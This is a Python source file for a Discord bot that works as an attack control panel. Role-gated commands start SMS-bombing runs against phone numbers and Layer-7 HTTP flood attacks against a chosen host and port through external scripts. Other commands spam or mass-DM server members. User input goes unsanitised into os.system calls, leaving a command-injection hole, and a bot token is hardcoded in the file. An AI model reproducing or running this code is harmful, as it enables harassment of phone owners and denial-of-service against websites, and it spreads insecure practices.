import random
import string
import discord
import os
import asyncio
from discord.ext import commands, tasks
from discord.ext.commands import has_permissions, CheckFailure

bot = commands.Bot(command_prefix = ';')

@bot.event
async def on_ready():
	print(f'logged in as {bot.user}')

@bot.command()
async def loopconn(ctx, loop):
    _loop = int(loop)
    conn = ctx.author.voice.channel
    for i in range(_loop):
        await conn.connect()
        #asyncio.sleep(0.5)
        await ctx.voice_client.disconnect()


@bot.command()
async def dm(ctx, member : discord.Member, message, loop):
    for i in range(int(loop)):
        user = bot.get_user(int(ctx.message.mentions[0].id))
        await user.send(message)

@bot.command()
@commands.has_role('spam permission')
#@commands.has_role('King TEE ติงเปรี๊ยะ')
async def spam(ctx, member : discord.Member,text,rounds):
    if discord.Member.id == "279970880610893833":
        await ctx.send("Sorry this is my own bot :)")
    roundd = int(rounds)
    await ctx.send('> `spam with {} loops`'.format(roundd))
#    await bot.delete_message(ctx.message)
    for x in range (0,roundd):
        await ctx.send(f"{text} <@{ctx.message.mentions[0].id}>")
        await ctx.send(f"{text} <@{ctx.message.mentions[0].id}>")
        await ctx.send(f"{text} <@{ctx.message.mentions[0].id}>")
        await ctx.send(f"{text} <@{ctx.message.mentions[0].id}>")
        await ctx.send(f"{text} <@{ctx.message.mentions[0].id}>")

@bot.command()
@commands.has_role('spam permission')
async def abuse1(ctx,number,counts):
	target = number
	count = counts
	if target[0] == "0":
		target = "66" + target[1:]
	if target == "66955020092":
		await ctx.send("???")
	else:
		await ctx.send(f"> Start sending SMS to {target} with {count} times")
		os.system(f"timeout 10s js Abuse.js {target} {count}")

@bot.command()
@commands.has_role('spam permission')
async def sms1(ctx,number,time,threads):
    target = str(number)
    timeout = int(time)
    threads = threads
    if target[0] == "0":
        target = "66" + target[1:]
    if target == "66955020092":
        await ctx.send("???")
    else:
        await ctx.send(f"> Start sending SMS to {target} {threads} threads {timeout} seconds.\n(Wait for {timeout} seconds then you can attack again.)")
        os.system(f"timeout {timeout}s quack --target {target} --tool SMS --timeout {timeout} --threads {threads}")
        await asyncio.sleep(timeout)
        await ctx.send("> quack Finished")

@bot.command()
@commands.has_role('spam permission')
async def s_sms1(ctx,number,loop):
    target = str(number)
    loop = loop
    if target[0] == "0":
       target = "66" + target[1:]
    if target == "66955020092":
        await ctx.send("???")
    else:
        await ctx.send(f"> Start sending SMS to {target} with {loop} loops")
        os.system(f"python3 smss.py {target} {loop}")

@bot.command()
@commands.has_role('spam permission')
async def tri(ctx,number,time,threads,counts):
    target = str(number)
    timeout = int(time)
    threads = threads
    if target[0] == "0":
       target = "66" + target[1:]
    if target == "66955020092":
        await ctx.send("???")
    else:
        await ctx.send(f"> Start sending SMS to {target} {threads} threads {timeout} seconds")
        os.system(f"timeout {timeout}s quack --target {target} --tool SMS --timeout {timeout} --threads {threads}")
        await asyncio.sleep(timeout)
        await ctx.send("> quack Finished")

@bot.command()
@commands.has_role('L7')
async def l7js(ctx,target,port,time):
	timeout = int(time)
	await ctx.send(f"> Start flooding to {target} port {port} {time} seconds")
	os.system(f"timeout {time}s js cookiel7.js {target} {port} {time}")
	await asyncio.sleep(timeout)
	await ctx.send("> Attack finished")

@bot.command()
@commands.has_role('L7')
async def l7go(ctx,target,time):
	timeout = int(time)
	await ctx.send(f"> Start flooding to {target} {time} seconds")
	os.system(f'timeout {time}s go run http.go -site {target}')
	await asyncio.sleep(timeout)
	await ctx.send('> Attack finished')

@bot.command()
@commands.has_role('L7')
async def ghp(ctx,host,port,path,method,threads,timeout):
	timeout = int(timeout)
	await ctx.send(f"Wait for 30s before its start flooding to {host} port:{port} path:{path} method:{method} threads:{threads} {timeout} seconds")
	os.system(f'timeout {timeout}s python3 proxyFlood.py {host} {port} {path} {method} {threads}')
	await asyncio.sleep(timeout+30)
	await ctx.send('Attack finished')


@bot.command()
async def howto(ctx):
    await ctx.send("> `-abuse{1,2,3} {target} {counts}\n> -sms{1,2,3} {target} {time} {threads}\n> -s_sms{1,2,3} {target} {loops}\n> -tri {target} {timeout} {threads} {counts} {loops}\n> -l7js {url} {port} {timeout}\n> -l7go {url} {timeout}`")

@bot.command()
async def bots(ctx):
    await ctx.send(f"Me")

@bot.command()
async def โหน่ง(ctx):
    await ctx.send(f"โหน่ง : สถานะ ตายแล้ว")

'''
@bot.event
async def on_message(message: discord.Message):
    try:
        mes = (f"{message.author}: '{message.content}' was sent in {message.guild}")
        print(mes)
    except:
        mes = (f"{message.author} directed '{message.content}'")
        print(mes)
'''

bot.run('NzMxMDQwNDc3OTU2Mjc2MjYz.XwgQgA._SdriDyaRkwLaxHQV-yqTIxQ_CQ')
